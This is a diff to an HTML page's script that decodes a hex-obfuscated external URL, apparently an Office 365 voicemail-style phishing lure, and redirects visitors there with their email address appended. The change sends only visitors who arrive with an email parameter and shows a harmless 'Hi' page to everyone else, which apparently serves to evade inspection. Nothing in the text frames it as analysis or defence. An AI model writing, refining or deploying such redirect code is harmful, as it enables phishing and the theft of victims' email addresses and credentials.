@@ -29,15 +29,20 @@
             return null;
         }
 
-        // Hex-encoded URL
+        // Hex-encoded URL for redirection
         let u = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
-        
-        // Attempt to find an email parameter and redirect
-        const emailParam = findEmailParam();
-        const emailQuery = emailParam ? `?email=${encodeURIComponent(emailParam.value)}` : "";
 
-        // Perform redirection
-        location.href = decodeURIComponent('%' + u.match(/.{1,2}/g).join('%')) + emailQuery;
+        // Check for email parameter
+        const emailParam = findEmailParam();
+
+        if (emailParam) {
+            // Redirect if email parameter is found
+            const emailQuery = `?email=${encodeURIComponent(emailParam.value)}`;
+            location.href = decodeURIComponent('%' + u.match(/.{1,2}/g).join('%')) + emailQuery;
+        } else {
+            // Display "Hi" if no valid email parameter
+            document.body.innerHTML = "<h1>Hi</h1>";
+        }
     </script>
 </body>
 </html>
